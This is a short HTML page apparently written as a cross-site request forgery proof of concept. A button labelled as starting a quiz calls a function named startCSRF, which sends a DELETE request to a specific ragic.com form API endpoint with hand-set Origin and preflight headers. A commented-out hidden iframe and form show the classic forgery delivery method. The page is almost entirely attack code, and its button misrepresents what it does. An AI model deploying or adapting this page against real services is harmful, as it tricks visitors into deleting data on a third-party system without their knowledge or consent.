<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <button onclick="startCSRF()">開始測驗</button>
    <!-- <iframe style="display: none" name="csrf-frame"></iframe>
    <form action="" method="DELETE" target="csrf-frame">
      <input type="submit" value="開始測驗" />
    </form> -->

    <script>
      function startCSRF() {
        let url = "https://ap2.ragic.com/yeeyan/forms5/1/4?api";
        fetch(url, {
          method: "DELETE",
          headers: {
            Origin: "xxx.ragic.com",
            "Access-Control-Request-Method": "DELETE",
          },
        })
          .then((res) => {
            console.log(res);
          })
          .catch((err) => {
            console.log(err);
          });
      }
    </script>
  </body>
</html>
